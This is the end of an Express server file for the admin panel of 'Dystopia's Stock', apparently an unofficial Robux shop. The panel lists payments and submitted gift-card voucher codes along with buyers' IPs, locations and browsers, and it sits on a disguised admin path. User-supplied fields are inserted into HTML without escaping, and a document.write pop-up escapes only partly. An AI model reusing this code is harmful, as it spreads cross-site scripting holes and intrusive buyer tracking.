                                            <span class="country-flag">${v.geo?.country ? getFlagEmoji(v.geo.country) : '🌍'}</span>
                                            ${v.geo?.countryName || 'Unknown'}
                                        </td>
                                        <td><span style="color:#39ff14;font-weight:600;">${v.robloxUsername || 'Unknown'}</span></td>
                                        <td><span class="badge badge-success">${(v.robuxAmount || 0).toLocaleString()}</span></td>
                                        <td><span class="badge badge-info">${v.method || 'Unknown'}</span></td>
                                        <td style="font-family:monospace;font-size:0.75rem;">${(v.cryptoAmount || 0).toFixed(8)} ${v.currency !== 'card' ? (v.currency || '').toUpperCase() : ''}</td>
                                        <td>$${(v.price || 0).toFixed(2)}</td>
                                        <td style="font-size:0.7rem;">${v.browser?.browserName || 'Unknown'} ${v.browser?.browserVersion || ''}</td>
                                        <td style="font-size:0.7rem;">${v.browser?.osName || 'Unknown'}</td>
                                        <td class="timestamp">${new Date(v.timestamp).toLocaleString()}</td>
                                        <td>
                                            <button class="delete-btn" onclick="deleteLog('${v.id}', 'crypto')">✕</button>
                                        </td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- VOUCHER TAB -->
                <div class="tab-content" id="tab-voucher">
                    <div class="table-controls">
                        <div class="left">
                            <span style="color:#8a8a8a;font-size:0.8rem;">${voucherLogs.length} entries</span>
                            <button class="clear-btn" onclick="clearLogs('voucher')">🗑️ Clear All</button>
                        </div>
                        <span style="color:#5a5a5a;font-size:0.7rem;">Showing latest 100 entries</span>
                    </div>
                    <div class="log-table">
                        <table>
                            <thead>
                                <tr>
                                    <th>IP</th>
                                    <th>🌍 Country</th>
                                    <th>👤 Roblox User</th>
                                    <th>Robux</th>
                                    <th>Price</th>
                                    <th>🎫 Vouchers</th>
                                    <th>🔑 Code</th>
                                    <th>💻 Browser</th>
                                    <th>Timestamp</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${voucherLogs.length === 0 ? `
                                    <tr><td colspan="10" class="empty-state">No vouchers submitted yet.</td></tr>
                                ` : voucherLogs.slice().reverse().slice(0, 100).map(v => `
                                    <tr>
                                        <td class="ip">${v.ip || 'Unknown'}</td>
                                        <td>
                                            <span class="country-flag">${v.geo?.country ? getFlagEmoji(v.geo.country) : '🌍'}</span>
                                            ${v.geo?.countryName || 'Unknown'}
                                        </td>
                                        <td><span style="color:#39ff14;font-weight:600;">${v.robloxUsername || 'Unknown'}</span></td>
                                        <td><span class="badge badge-success">${(v.robuxAmount || 0).toLocaleString()}</span></td>
                                        <td>$${(v.price || 0).toFixed(2)}</td>
                                        <td style="font-size:0.75rem;">${(v.vouchers || []).map(x => '$' + x).join(' + ') || '-'}</td>
                                        <td>
                                            <button class="view-btn" onclick="showCode('${v.id}')">👁️ View</button>
                                        </td>
                                        <td style="font-size:0.7rem;">${v.browser?.browserName || 'Unknown'} · ${v.browser?.osName || 'Unknown'}</td>
                                        <td class="timestamp">${new Date(v.timestamp).toLocaleString()}</td>
                                        <td>
                                            <button class="delete-btn" onclick="deleteLog('${v.id}', 'voucher')">✕</button>
                                        </td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- ADMIN TAB -->
                <div class="tab-content" id="tab-admin">
                    <div class="table-controls">
                        <div class="left">
                            <span style="color:#8a8a8a;font-size:0.8rem;">${adminLogs.length} entries</span>
                            <button class="clear-btn" onclick="clearLogs('admin')">🗑️ Clear All</button>
                        </div>
                        <span style="color:#5a5a5a;font-size:0.7rem;">Showing latest 100 entries</span>
                    </div>
                    <div class="log-table">
                        <table>
                            <thead>
                                <tr>
                                    <th>IP</th>
                                    <th>🌍 Country</th>
                                    <th>Action</th>
                                    <th>Details</th>
                                    <th>Timestamp</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${adminLogs.length === 0 ? `
                                    <tr><td colspan="6" class="empty-state">No admin activity yet.</td></tr>
                                ` : adminLogs.slice().reverse().slice(0, 100).map(v => `
                                    <tr>
                                        <td class="ip">${v.ip || 'Unknown'}</td>
                                        <td>
                                            <span class="country-flag">${v.geo?.country ? getFlagEmoji(v.geo.country) : '🌍'}</span>
                                            ${v.geo?.countryName || 'Unknown'}
                                        </td>
                                        <td><span class="badge ${v.action === 'LOGIN' ? 'badge-success' : v.action === 'LOGIN_FAILED' ? 'badge-danger' : 'badge-warning'}">${v.action || 'Unknown'}</span></td>
                                        <td style="font-size:0.8rem;">${v.details || '-'}</td>
                                        <td class="timestamp">${new Date(v.timestamp).toLocaleString()}</td>
                                        <td>
                                            <button class="delete-btn" onclick="deleteLog('${v.id}', 'admin')">✕</button>
                                        </td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="footer">
                    <span>Dystopia's Stock Admin Panel — <span class="highlight">free john lick</span> <span class="heart">❤️</span></span>
                </div>
            </div>

            <script>
                window.__voucherCodes = ${JSON.stringify(voucherCodeMap)};

                document.querySelectorAll('.tabs button').forEach(function(btn) {
                    btn.addEventListener('click', function() {
                        document.querySelectorAll('.tabs button').forEach(function(b) {
                            b.classList.remove('active');
                        });
                        this.classList.add('active');
                        document.querySelectorAll('.tab-content').forEach(function(t) {
                            t.classList.remove('active');
                        });
                        document.getElementById('tab-' + this.dataset.tab).classList.add('active');
                    });
                });

                function deleteLog(logId, logType) {
                    fetch('/api/admin/delete-log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ logId: logId, logType: logType })
                    })
                    .then(function(res) { return res.json(); })
                    .then(function(data) {
                        if (data.success) location.reload();
                        else alert('Failed: ' + (data.error || 'Unknown error'));
                    })
                    .catch(function(err) { alert('Error: ' + err.message); });
                }

                function clearLogs(logType) {
                    fetch('/api/admin/clear-logs', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ logType: logType })
                    })
                    .then(function(res) { return res.json(); })
                    .then(function(data) {
                        if (data.success) location.reload();
                        else alert('Failed: ' + (data.error || 'Unknown error'));
                    })
                    .catch(function(err) { alert('Error: ' + err.message); });
                }

                function showCode(logId) {
                    var code = window.__voucherCodes[logId];
                    if (!code) return alert('Code not found');
                    var w = window.open('', '_blank');
                    w.document.write('<html><head><title>Voucher Code</title></head><body style="background:#0d0d0d;color:#39ff14;padding:20px;font-family:monospace;font-size:14px;"><h3 style="color:#39ff14;margin-bottom:12px;">Voucher Code(s)</h3><pre style="background:#050505;padding:20px;border-radius:8px;white-space:pre-wrap;word-break:break-all;border:1px solid rgba(57,255,20,0.2);">' + code.replace(/</g, '&lt;') + '</pre><button onclick="navigator.clipboard.writeText(\'' + code.replace(/'/g, "\\\\'").replace(/\n/g, '\\\\n') + '\').then(()=>this.textContent=\\'✅ Copied!\\')" style="margin-top:12px;padding:8px 16px;background:#39ff14;color:#050505;border:none;border-radius:6px;font-weight:600;cursor:pointer;">Copy</button></body></html>');
                    w.document.title = 'Voucher Code';
                }
            </script>
        </body>
        </html>
    `);
});

// ============================================================
// SERVE MAIN SITE
// ============================================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// ============================================================
// 404 HANDLER
// ============================================================
app.use((req, res) => {
    if (req.path.startsWith('/api/')) {
        res.status(404).json({ error: 'API endpoint not found' });
    } else if (req.path.startsWith('/aipotsyddmin') && !req.path.includes('/login')) {
        res.redirect('/aipotsyddmin/login');
    } else {
        res.sendFile(path.join(__dirname, '../index.html'));
    }
});

// ============================================================
// EXPORT FOR VERCEL
// ============================================================
module.exports = app;
